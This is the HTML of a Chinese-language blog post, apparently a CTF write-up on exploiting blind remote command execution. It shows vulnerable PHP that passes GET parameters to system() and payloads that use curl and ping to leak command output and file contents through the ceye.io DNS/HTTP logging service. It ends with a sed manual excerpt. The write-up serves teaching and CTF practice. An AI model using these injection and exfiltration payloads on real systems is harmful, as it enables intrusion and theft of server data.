@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="无回显的RCE"/>
+  <meta name="twitter:description" content="前言
+
+遇到一个题目，是一个命令执行，但是并没有回显，也就是说看不到命令执行的结果。在这种时候就需要利用dnslog来查看命令执行的结果。自己本身对于盲打rce就不太会，这次做一个总结。
+这里介绍一个dnslog利用平台，ceye。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>无回显的RCE &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        无回显的RCE
+                    </h1>
+                    <h2 class="headline">
+                    Jan 1, 0001 00:00
+                    · 278 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                              <a href="http://yang1k.github.io/tags/linux">Linux</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#前言">前言</a></li>
+<li><a href="#测试">测试</a>
+<ul>
+<li><a href="#记录在http-request中">记录在http request中</a></li>
+<li><a href="#记录在dns-query中">记录在dns query中</a>
+<ul>
+<li><a href="#简单介绍">简单介绍</a></li>
+<li><a href="#真题解析">真题解析</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#linux命令三剑客-sed">linux命令三剑客-sed</a>
+<ul>
+<li><a href="#何为sed">何为sed</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <h2 id="前言">前言</h2>
+
+<p>遇到一个题目，是一个命令执行，但是并没有回显，也就是说看不到命令执行的结果。在这种时候就需要利用dnslog来查看命令执行的结果。自己本身对于盲打rce就不太会，这次做一个总结。
+这里介绍一个dnslog利用平台，<a href="http://ceye.io">ceye</a>。
+<!-- more --></p>
+
+<h2 id="测试">测试</h2>
+
+<p><a href="http://ceye.io/payloads">平台的payload</a></p>
+
+<h3 id="记录在http-request中">记录在http request中</h3>
+
+<p>题目地址</p>
+
+<pre><code>http://192.168.10.55/
+</code></pre>
+
+<p>后台源码</p>
+
+<pre><code>&lt;?php
+$a = $_GET['id'];
+system(&quot;$a&quot;);
+?&gt;
+
+</code></pre>
+
+<p>payload</p>
+
+<pre><code>curl http://192.168.10.55.o40fok.ceye.io/?id=`whoami`
+</code></pre>
+
+<p>只能使用linux的curl访问才会成功，在浏览器直接访问时无效的。
+效果
+<strong><em>图1</em></strong>
+<img src="http://p0j0hyu3s.bkt.clouddn.com/%E5%9B%BE1.jpg" alt="图2" /></p>
+
+<h3 id="记录在dns-query中">记录在dns query中</h3>
+
+<h4 id="简单介绍">简单介绍</h4>
+
+<p>DNS在解析的时候是逐级解析的，并且会留下日志，所以可以将回显放在高级域名，这样在解析的时候就会将回显放在高级域名中，我们就可以在dns query中看到回显。
+举个例子</p>
+
+<p>在注册ceye.io之后会分配一个三级域名。就是******.ceye.io。</p>
+
+<pre><code>ping `whoami`.******.ceye.io
+</code></pre>
+
+<p>上面这条命令最终在ping的时候ping的是“root.******.ceye.io”，root就是我们构造的恶意命令执行的结果，我们把它放在四级域名这里，这样在DNS解析的时候就会记录下root这个四级域名。然后可以在ceye平台上看到我们的dns解析日志。也就看到了命令执行的回显。(个人理解，如有错误，烦请指出。)</p>
+
+<p>所以这种方法的使用必须有ping命令。</p>
+
+<h4 id="真题解析">真题解析</h4>
+
+<p>题目存在robots.txt文件，访问发现两个文件</p>
+
+<pre><code>index.txt
+where_is_flag.php
+</code></pre>
+
+<p>index.php代码</p>
+
+<pre><code>&lt;?php 
+include(&quot;where_is_flag.php&quot;);
+echo &quot;ping&quot;;
+$ip =(string)$_GET['ping'];
+$ip =str_replace(&quot;&gt;&quot;,&quot;0.0&quot;,$ip);
+system(&quot;ping  &quot;.$ip);
+</code></pre>
+
+<p>可以看到存在ping命令，但是测试没有回显，于是就采用dnslog的方式来查看回显。
+payload</p>
+
+<pre><code>ping `cat where_is_flag.php|sed s/[[:space:]]/xx/g`.******.ceye.io
+# 因为域名中不允许有空格，但是php代码中可能会含有空格，所以使用sed命令将php代码的空格替换为xx
+</code></pre>
+
+<p>最终的url</p>
+
+<pre><code>http://192.168.5.90/?ping=`cat where_is_flag.php|sed s/[[:space:]]/xx/g`.******.ceye.io
+</code></pre>
+
+<p>在dns query中查看
+<strong><em>图2</em></strong>
+<img src="http://p0j0hyu3s.bkt.clouddn.com/%E5%9B%BE2.jpg" alt="图2" />
+可以看到文件的内容是</p>
+
+<pre><code>&lt;?php $flag=&quot;dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php&quot;;?&gt;
+</code></pre>
+
+<p>由此得知flag.php的位置，继续打印flag.php的内容
+获取flag的url</p>
+
+<pre><code>http://192.168.5.90/?ping=`cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed s/[[:space:]]/xx/g`.******.ceye.io
+
+</code></pre>
+
+<p><strong><em>图三</em></strong></p>
+
+<p><img src="http://p0j0hyu3s.bkt.clouddn.com/%E5%9B%BE3.jpg" alt="图3" /></p>
+
+<p>得到flag。</p>
+
+<h2 id="linux命令三剑客-sed">linux命令三剑客-sed</h2>
+
+<h3 id="何为sed">何为sed</h3>
+
+<p>sed 是Stream Editor（字符流编辑器）的缩写，是一种可以对文件内容临时做处理，并且不实际修改内容的工具(不过sed是可以实现修改文件内容的操作的)。</p>
+
+<p>看一下官方手册</p>
+
+<pre><code>
+  -n, --quiet, --silent
+                 suppress automatic printing of pattern space
+  -e script, --expression=script
+                 add the script to the commands to be executed
+  -f script-file, --file=script-file
+                 add the contents of script-file to the commands to be executed
+  --follow-symlinks
+                 follow symlinks when processing in place; hard links
+                 will still be broken.
+  -i[SUFFIX], --in-place[=SUFFIX]
+                 edit files in place (makes backup if extension supplied).
+                 The default operation mode is to break symbolic and hard links.
+                 This can be changed with --follow-symlinks and --copy.
+  -c, --copy
+                 use copy instead of rename when shuffling files in -i mode.
+                 While this will avoid breaking links (symbolic or hard), the
+                 resulting editing operation is not atomic.  This is rarely
+                 the desired mode; --follow-symlinks is usually enough, and
+                 it is both faster and more secure.
+  -l N, --line-length=N
+                 specify the desired line-wrap length for the `l' command
+  --posix
+                 disable all GNU extensions.
+  -r, --regexp-extended
+                 use extended regular expressions in the script.
+  -s, --separate
+                 consider files as separate rather than as a single continuous
+                 long stream.
+  -u, --unbuffered
+                 load minimal amounts of data from the input files and flush
+                 the output buffers more often
+      --help     display this help and exit
+      --version  output version information and exit
+
+</code></pre>
+
+<pre><code>cat where_is_flag.php|sed s/[[:space:]]/xx/g
+</code></pre>
+
+<p>由手册可知，s参数是替换，所以这条命令就是将where_is_flag.php的空格替换为xx，这样就避免了域名中出现空格导致无法获得回显得情况。</p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2f%25E6%25B2%25A1%25E6%259C%2589%25E5%259B%259E%25E6%2598%25BE%25E7%259A%2584rce%2f - %e6%97%a0%e5%9b%9e%e6%98%be%e7%9a%84RCE "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
